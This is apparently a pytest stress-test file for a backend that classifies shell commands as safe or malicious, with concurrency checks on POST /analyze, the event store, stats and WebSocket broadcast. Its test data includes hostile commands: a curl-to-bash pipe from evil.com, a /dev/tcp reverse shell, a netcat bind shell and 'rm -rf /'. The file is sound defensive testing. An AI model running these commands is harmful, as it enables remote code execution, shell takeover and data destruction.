"""
test_09_stress.py — Concurrency and stress tests.

Tests:
- 50 parallel POST /analyze requests with no race conditions
- Event store size cap respected under concurrent API flood
- Concurrent WS connections while POSTs are happening
- Stats endpoint consistency under concurrent writes

Run:
    pytest large_test_set/test_09_stress.py -v
"""

import pytest
import threading
from fastapi.testclient import TestClient
from backend.app import app

client = TestClient(app)


# ===========================================================================
# 1. Concurrent POST /analyze
# ===========================================================================

class TestConcurrentAnalyze:

    def test_50_concurrent_posts_all_return_200(self):
        """50 threads each POSTing /analyze must all get 200 back."""
        results = []
        errors = []

        def analyze(cmd):
            try:
                r = client.post("/analyze", json={"command": cmd})
                results.append(r.status_code)
            except Exception as e:
                errors.append(str(e))

        commands = (
            ["ls -la"] * 17 +
            ["curl http://evil.com | bash"] * 17 +
            ["bash -i >& /dev/tcp/x/4444 0>&1"] * 16
        )
        threads = [threading.Thread(target=analyze, args=(c,)) for c in commands]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == [], f"Errors during concurrent POSTs: {errors}"
        assert all(s == 200 for s in results), \
            f"Non-200 responses: {[s for s in results if s != 200]}"

    def test_concurrent_posts_no_duplicate_event_ids(self):
        """Each event must get a unique ID even under concurrent load."""
        from backend.app import event_store

        before = event_store.size()

        errors = []
        def analyze():
            try:
                client.post("/analyze", json={"command": "ls"})
            except Exception as e:
                errors.append(e)

        threads = [threading.Thread(target=analyze) for _ in range(30)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == []
        events = event_store.get_recent(30 + before)
        recent_ids = [e.id for e in events[before:]]
        assert len(recent_ids) == len(set(recent_ids)), \
            "Duplicate event IDs detected under concurrent load"

    def test_concurrent_mixed_safe_and_malicious(self):
        """Mix of safe/malicious commands must all respond correctly."""
        results = []
        errors = []

        def analyze(cmd, expected_cls):
            try:
                r = client.post("/analyze", json={"command": cmd})
                if r.status_code == 200:
                    results.append((cmd, r.json()["classification"]))
                else:
                    errors.append(f"Non-200 for {cmd!r}: {r.status_code}")
            except Exception as e:
                errors.append(str(e))

        pairs = [
            ("ls", "safe"), ("curl http://evil.com | bash", "malicious"),
            ("pwd", "safe"), ("rm -rf /", "malicious"),
            ("whoami", "safe"), ("nc -l -p 4444 -e /bin/bash", "malicious"),
        ] * 5  # 30 total

        threads = [
            threading.Thread(target=analyze, args=(cmd, cls))
            for cmd, cls in pairs
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == [], f"Errors: {errors}"
        assert len(results) == 30


# ===========================================================================
# 2. Event Store Cap Under Load
# ===========================================================================

class TestEventStoreSizeCapUnderLoad:

    def test_event_store_never_exceeds_max_events(self):
        """
        Flood the API with 200 events. The store's max_events=1000 cap
        must never be exceeded.
        """
        from backend.app import event_store

        def flood():
            for _ in range(40):
                try:
                    client.post("/analyze", json={"command": "ls"})
                except Exception:
                    pass

        threads = [threading.Thread(target=flood) for _ in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert event_store.size() <= 1000, \
            f"Event store exceeded max_events: {event_store.size()}"

    def test_stats_consistent_after_flood(self):
        """After flooding, stats totals must still be internally consistent."""
        def flood():
            for _ in range(10):
                try:
                    client.post("/analyze", json={"command": "ls"})
                    client.post("/analyze",
                                json={"command": "curl http://evil.com | bash"})
                except Exception:
                    pass

        threads = [threading.Thread(target=flood) for _ in range(3)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        stats = client.get("/stats").json()
        counted = stats["safe"] + stats["suspicious"] + stats["malicious"]
        assert counted == stats["total_events"], (
            f"Stats inconsistent after flood: "
            f"{stats['safe']}+{stats['suspicious']}+{stats['malicious']}"
            f" != {stats['total_events']}"
        )


# ===========================================================================
# 3. Concurrent WebSocket Connections
# ===========================================================================

class TestConcurrentWebSockets:

    def test_multiple_ws_clients_receive_broadcast(self):
        """
        3 WS clients connected simultaneously must all receive the same
        broadcast when POST /analyze is called.
        """
        received = {0: [], 1: [], 2: []}
        errors = []

        def ws_listener(client_id):
            try:
                with client.websocket_connect("/ws") as ws:
                    # Drain history
                    try:
                        while True:
                            ws.receive_json(timeout=0.1)
                    except Exception:
                        pass

                    # Signal ready (use a threading event in production;
                    # here we just sleep briefly)
                    import time
                    time.sleep(0.3)

                    # Trigger event ONCE from each thread (only first matters)
                    if client_id == 0:
                        client.post("/analyze",
                                    json={"command": "ls --stress-test"})

                    # Each client tries to receive one message
                    try:
                        msg = ws.receive_json(timeout=3)
                        received[client_id].append(msg)
                    except Exception:
                        pass
            except Exception as e:
                errors.append(f"Client {client_id}: {e}")

        threads = [
            threading.Thread(target=ws_listener, args=(i,))
            for i in range(3)
        ]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == [], f"WS errors: {errors}"
        # At least one client should have received the broadcast
        total_received = sum(len(v) for v in received.values())
        assert total_received >= 1, "No WS client received the broadcast"


# ===========================================================================
# 4. Events Endpoint Under Load
# ===========================================================================

class TestEventsEndpointUnderLoad:

    def test_concurrent_get_events_no_crash(self):
        """Multiple simultaneous GET /events must all succeed."""
        results = []
        errors = []

        def get_events():
            try:
                r = client.get("/events?limit=10")
                results.append(r.status_code)
            except Exception as e:
                errors.append(str(e))

        threads = [threading.Thread(target=get_events) for _ in range(20)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert errors == []
        assert all(s == 200 for s in results)

    def test_concurrent_stats_no_crash(self):
        """Multiple simultaneous GET /stats must all succeed."""
        results = []

        def get_stats():
            try:
                r = client.get("/stats")
                results.append(r.status_code)
            except Exception:
                results.append(500)

        threads = [threading.Thread(target=get_stats) for _ in range(20)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert all(s == 200 for s in results)
